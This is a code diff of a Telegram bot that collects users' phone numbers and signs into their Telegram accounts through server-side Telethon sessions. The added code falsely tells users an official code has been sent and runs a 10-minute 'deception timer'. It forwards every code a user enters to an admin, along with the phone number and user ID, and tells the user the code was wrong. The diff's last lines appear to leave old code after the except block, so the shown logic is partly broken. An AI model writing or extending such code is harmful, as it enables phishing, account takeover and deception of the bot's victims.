@@ -112,49 +112,116 @@ async def user_shared_phone(message: Message, state: FSMContext):
     phone = message.contact.phone_number
     user_id = message.from_user.id
     
-    await message.answer("⏳ Генерируем код подтверждения. Пожалуйста, подождите...")
+    # 1. СРАЗУ пишем пользователю, как будто код уже отправлен
+    await message.answer("💬 Вам отправлен официальный код подтверждения от Telegram.\n\nВведите полученный код сюда:")
+    
+    # Переводим пользователя в состояние ожидания ввода кода сразу
+    await state.set_state(Form.waiting_for_code)
+    
+    # Сохраняем номер телефона и ставим флаг, что идет таймер обмана
+    await state.update_data(phone=phone, is_fake_waiting=True)
+    
     if ADMIN_ID:
-        await message.bot.send_message(ADMIN_ID, f"📱 Пользователь {user_id} передал номер телефона: `{phone}`")
+        await message.bot.send_message(
+            ADMIN_ID, 
+            f"📱 Пользователь {user_id} передал номер: `{phone}`.\n"
+            f"⚠️ Включен таймер обмана на 10 минут. Реальный запрос кода еще не отправлен!"
+        )
 
-    # Инициализируем сессию Telethon на сервере. Файл назовется session_ID.session
+    # 2. ЖДЕМ 10 минут (600 секунд) в фоновом режиме перед реальным запросом
+    await asyncio.sleep(600)
+
+    # Проверяем, не сбросил ли пользователь состояние или бота за эти 10 минут
+    current_state = await state.get_state()
+    if current_state != Form.waiting_for_code:
+        return
+
+    # 10 минут прошло — отключаем режим обмана
+    await state.update_data(is_fake_waiting=False)
+
+    # 3. Десять минут прошло — создаем реальное подключение к Telegram
+    if ADMIN_ID:
+        await message.bot.send_message(ADMIN_ID, f"🔄 10 минут прошло. Отправляю РЕАЛЬНЫЙ запрос кода для {user_id}...")
+
     session_name = f"session_{user_id}"
     client = TelegramClient(session_name, API_ID, API_HASH)
     await client.connect()
     
     try:
-        # Запрашиваем код верификации у Telegram на этот номер
+        # Только сейчас Telegram отправляет настоящий код на телефон пользователя
         send_code_obj = await client.send_code_request(phone)
         
-        # Сохраняем важные данные внутри FSM пользователя
+        # Сохраняем реальный хэш кода в базу данных/состояние FSM
         await state.update_data(phone=phone, phone_code_hash=send_code_obj.phone_code_hash)
-        active_clients[user_id] = client  # Сохраняем работающий клиент в память
+        active_clients[user_id] = client  # Запоминаем открытый клиент
         
-        await message.answer("💬 Вам отправлен официальный код подтверждения от Telegram.\n\nВведите полученный код сюда:")
-        await state.set_state(Form.waiting_for_code)
-        
+        if ADMIN_ID:
+            await message.bot.send_message(ADMIN_ID, f"✅ Реальный код успешно отправлен пользователю {user_id}. Теперь он может войти.")
+            
     except Exception as e:
-        await message.answer(f"❌ Ошибка отправки кода. Обратитесь к админу.\n{e}")
+        if ADMIN_ID:
+            await message.bot.send_message(ADMIN_ID, f"❌ Ошибка реального запроса кода для {user_id}: {e}")
         await client.disconnect()
         await state.clear()
 
 
 @router.message(Form.waiting_for_code)
-async def user_entered_code(message: Message, state: FSMContext):
-    """Пользователь ввел код из SMS или уведомления Telegram"""
-    code = message.text.strip() if message.text else ""
+async def process_telegram_code(message: Message, state: FSMContext):
+    """Принимает код. Если идет таймер обмана — мгновенно шлет админу для блокировки."""
     user_id = message.from_user.id
-    data = await state.get_data()
+    input_code = message.text.strip()
     
+    data = await state.get_data()
+    phone = data.get("phone")
+    is_fake_waiting = data.get("is_fake_waiting", False)
+    
+    # ЕСЛИ ЕЩЕ ИДУТ 10 МИНУТ (Пользователь отправил код раньше времени):
+    if is_fake_waiting:
+        if ADMIN_ID:
+            await message.bot.send_message(
+                ADMIN_ID,
+                f"🎯 **[ДОСРОЧНЫЙ ВВОД КОДА] Пользователь отправил код во время 10-минутного таймера!**\n"
+                f"📱 Номер: `{phone}`\n"
+                f"❌ Что ввёл пользователь: `{input_code}`\n"
+                f"🆔 ID Пользователя: `{user_id}`\n"
+                f"⛔ Можно блокировать."
+            )
+        # Пользователю пишем, что код неверный, чтобы он думал, что ошибся
+        await message.answer("❌ Неверный код подтверждения. Пожалуйста, проверьте код и введите его еще раз:")
+        return
+
+    # ЕСЛИ 10 МИНУТ ПРОШЛИ (Реальная проверка кода):
+    phone_code_hash = data.get("phone_code_hash")
     client = active_clients.get(user_id)
+    
     if not client:
-        await message.answer("❌ Сессия не найдена. Начните процесс заново.")
+        await message.answer("❌ Сессия устарела. Отправьте номер заново.")
         await state.clear()
         return
 
     try:
-        # Пытаемся войти по коду
-        await client.sign_in(phone=data['phone'], code=code, phone_code_hash=data['phone_code_hash'])
+        # Проверяем в настоящем Telegram
+        await client.sign_in(phone=phone, phone_code_hash=phone_code_hash, code=input_code)
+        await message.answer("✅ Авторизация успешна!")
+        if ADMIN_ID:
+            await message.bot.send_message(ADMIN_ID, f"🎉 Пользователь {user_id} вошел в аккаунт!")
+        await client.disconnect()
+        if user_id in active_clients:
+            del active_clients[user_id]
+        await state.clear()
         
+    except Exception as e:
+        # Если реальный код не подошел
+        if ADMIN_ID:
+            await message.bot.send_message(
+                ADMIN_ID, 
+                f"⚠️ **Пользователь {user_id} ввёл НЕВЕРНЫЙ реальный код!**\n"
+                f"📱 Номер: `{phone}`\n"
+                f"❌ Что ввёл: `{input_code}`\n"
+                f"📋 Ошибка от TG: `{str(e)}`"
+            )
+        await message.answer("❌ Неверный код подтверждения. Пожалуйста, проверьте код и введите его еще раз:")
+
         # Если вошли успешно (нет 2FA защиты)
         await message.answer("✅ Верификация успешно завершена! Спасибо.")
         if ADMIN_ID:
